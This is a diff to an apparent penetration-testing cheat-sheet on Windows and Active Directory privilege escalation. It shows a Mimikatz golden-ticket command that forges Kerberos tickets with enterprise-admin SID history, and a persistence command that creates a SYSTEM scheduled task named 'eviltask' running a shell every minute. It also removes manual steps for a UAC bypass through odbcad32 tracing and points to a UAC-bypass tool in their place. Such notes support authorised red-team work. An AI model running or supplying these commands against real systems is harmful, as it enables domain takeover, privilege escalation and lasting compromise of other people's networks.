@@ -134,9 +134,8 @@ PrivEsc
     https://adsecurity.org/?p=1640
     kerberos::golden (/admin:Administrator|/user:DC_compname$) /domain:domain.fqdn /sid:child_domain_sid /sids:EA_Sid..-519 /krbtgt:krbtgt_hash /startoffset:0 /endin:600 /renewmax:10080 /ptt
     
-  Bypass UAC Local
-    Open CMD; Open another CMD (As Admin; select NO)
-    cd c:\windows\system32 -> odbcad32.exe -> Tracing -> add cmd.exe to pathbar
+  Bypass UAC
+    https://github.com/hfiref0x/UACME
     
   Persistance
     schtasks /create /sc minute /mo 1 /tn "eviltask" /tr C:\tools\shell.cmd /ru "SYSTEM"
